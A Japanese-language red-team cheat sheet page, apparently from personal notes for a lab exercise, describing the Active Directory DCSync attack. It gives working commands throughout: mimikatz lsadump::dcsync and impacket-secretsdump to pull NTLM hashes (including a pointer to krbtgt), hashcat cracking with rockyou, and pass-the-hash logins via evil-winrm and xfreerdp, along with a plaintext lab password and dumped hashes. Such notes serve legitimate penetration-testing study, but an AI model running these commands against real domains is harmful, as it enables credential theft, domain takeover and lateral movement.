---
title: DC Sync
parent: Active Directory
grand_parent: Red Team
---

## 攻撃の概要
レプリケーションを偽装し、予備DCのように振る舞うことでドメイン内の任意のユーザー資格情報をDCに要求できるようになる
### 前提条件
以下の権限が割り振られたユーザが必要
- 「 ディレクトリの変更のレプリケーション」
- 「すべてのディレクトリの変更のレプリケーション」
- 「フィルターされたセット内のディレクトリの変更のレプリケーション」

デフォルトでは以下のグループのメンバーに上記の権限が割り当てられている
- Domain Admins
- Enterprise Admins
- Administrators

# Windows（イントラネット）から実施
Domain Adminsの権限を持つユーザでログイン
```zsh
xfreerdp3 /cert:ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.158.75 /dynamic-resolution
```

```powershell
.\mimikatz.exe

lsadump::dcsync /user:corp\dave
```
- ターゲットはdave
- krbtgtならdaveの部分を変更して実行
![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260502090939.png)
NTLM Hash
```
08d7a47a6f9f66b97b1bae4178747494
```

# ハッシュの解析
```zsh
echo '08d7a47a6f9f66b97b1bae4178747494' > hashes.dcsync
```

```zsh
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
![](11_Active_Directory/02_AD認証への攻撃/assets/images/Pasted%20image%2020250818234732.png)
---
# Kali（リモートホスト）から実施
## ハッシュ値の取得
```zsh
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.158.70
```
![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260502090947.png)

---
# Exmple
```powershell
#mimikatz
lsadump::dcsync /user:corp\jeffadmin
```
![](../../../assets/old_cheatsheet/Assets/Images/Pasted%20image%2020260502091329.png)
```
e460605a9dbd55097c6cf77af2f89a03
```

# Evil-WinRM
```zsh
evil-winrm -i 192.168.184.70 -u jeffadmin -H e460605a9dbd55097c6cf77af2f89a03
```

# RDP
```zsh
sudo xfreerdp3 /cert:ignore /u:jeffadmin /d:corp.com /pth:'e460605a9dbd55097c6cf77af2f89a03' /v:192.168.184.74 /dynamic-resolution
```
これはうまくいかなかった